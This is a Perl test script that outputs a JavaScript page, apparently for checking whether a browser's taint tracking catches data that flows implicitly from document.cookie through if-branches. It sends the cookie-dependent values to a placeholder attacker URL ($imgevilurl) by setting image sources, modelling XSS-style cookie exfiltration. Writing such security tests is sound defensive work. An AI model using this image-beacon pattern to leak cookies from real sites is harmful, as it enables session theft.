#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_IFEQ";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 0;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 

		if (2 && dut && 0) {
			notevil = 1;
		} else {
			notevil = 3;
		}
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val 
		if ($evil) {
			if (2 && dut2 && 0) {
				notevil2 = 1;
			} else {
				notevil2 = 3;
			}
		}
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		// normal usage 	
		if (2 && dut3 && evil) {
			notevil3 = 1;
		} else {
			notevil3 = 3;
		}
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
    </script>
|;

require "xss_basic_footer.pl";
